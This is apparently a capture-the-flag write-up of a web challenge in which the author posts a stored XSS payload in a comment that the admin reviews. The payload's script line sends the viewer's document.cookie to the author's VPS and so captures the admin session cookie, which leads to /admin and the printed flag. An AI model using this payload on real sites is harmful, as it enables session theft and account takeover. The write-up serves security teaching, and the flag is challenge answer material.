# Star Wars

![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

For this website, we can signup for an acccount and then log in. When we do, we see we can post comments and it says that the admin will review it (smells like XSS).

![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

I used this XSS payload to callback to my VPS:

```javascript
<script type="text/javascript">document.location="http://<vpsip>:1337/?c="+document.cookie;</script>
```

The page reloads right away so we get hits from ourselves but one of them is the admin:

![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

This is confirmed by ID 1 after decoding it with flask-unsign. We can now use this cookie and go on the standard `/admin` endpoint. This was an educated guess for me but it can easily be discovered with some quick fuzzing.

![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

flag{a538c88890d45a382e44dfd00296a99b}

PS: I'm not sure why this was classes as Medium when Marmalade was originally classes as Easy. Such is life.
